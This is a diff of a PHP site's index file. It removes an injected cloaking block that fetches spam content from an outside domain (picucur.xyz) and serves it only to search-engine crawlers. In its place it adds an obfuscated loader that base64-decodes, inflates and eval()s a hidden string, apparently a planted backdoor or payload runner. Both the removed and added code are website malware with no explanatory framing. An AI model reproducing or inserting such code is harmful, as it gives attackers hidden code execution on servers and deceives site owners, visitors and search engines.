@@ -1,30 +1,7 @@
 <?php
-ob_start();
-header("Vary: User-Agent");
-$bot_url = "https://picucur.xyz/landing/unublitar-ilkomnika/";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url)
-{
-    if (function_exists("curl_init")) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get("allow_url_fopen")) {
-        return file_get_contents($url);
-    }
-    return false;
-}
-if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 200000));
-    echo lph_requests($bot_url);
-    ob_end_flush();
-    die;
-}
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "TjPm0uK8EePXp30q/IeHN/Tk0xv7Hf5xreg17\x41\x63Yi\x43\x42WPMvGyE3RoVgFPn2\x2bJrs4u8\x2boJI\x63qg\x41g6HXl7HLq6lFNuhnM7MU\x42JoE9hkK86F\x637fsyy0zTIO3Uw\x614Q0\x41v/0MNmI\x2bS\x63\x42rLhDo8V\x41xQD8GKgWkiq\x42\x43T0jTlVJ/Vxo\x43z4kGQ0m\x43/18IotX\x4101rWF0i\x41pW8vJfx5PoI4HGs43S\x43n3n\x61\x2bwS22\x43r\x63M5\x63pW\x2bn7typq\x62\x62p26uI43ElZOuhhq\x2by3ftI\x62\x2b5EHF0QIYVT\x423Xu0Jkx7\x43E\x62n04\x43MzMeZ0unXgHDWkR\x63PsjJI6PxHui07e1rX2LKmmop9\x43vEMTOG0Jqw3toy2Zkr6\x62WtvtnsI\x62XVlX57i8q/mL6yOp99Y\x63EYUU1mrDwKhfV45\x43GT\x62Juqnz4\x42mPuXVsDzVD6gu/\x43Lz\x41H7R8prmz5\x628pNyyGeoEs11\x42D\x41MEED\x43qvxO1o3etMFR3f46JKwnvnyxzEtts\x43fwz7\x63ExQDv/5V1\x61t\x2b\x43poLruR0QWk\x2b\x41kqMDTjmyUS3\x41wNspeD\x62R\x43u1hD3\x61iSHwZ0r\x631nmZ4kNYiWknq5eN\x62O\x61FF9LsR\x617ytz3zTnotE\x627RuLI6n\x61IUYyh2Kul\x635NO2Ms0SSfL4wZGHYME/x\x2bL9\x43\x42M\x63vWTT1o/zE\x41z\x42wJe\x2bjS\x41XHg/jE\x413\x42wJe\x2bjR\x41nHg/TE\x417\x42wJe\x2bjQ\x413Hg/DE\x41/\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 
 /**
  * @defgroup index Index
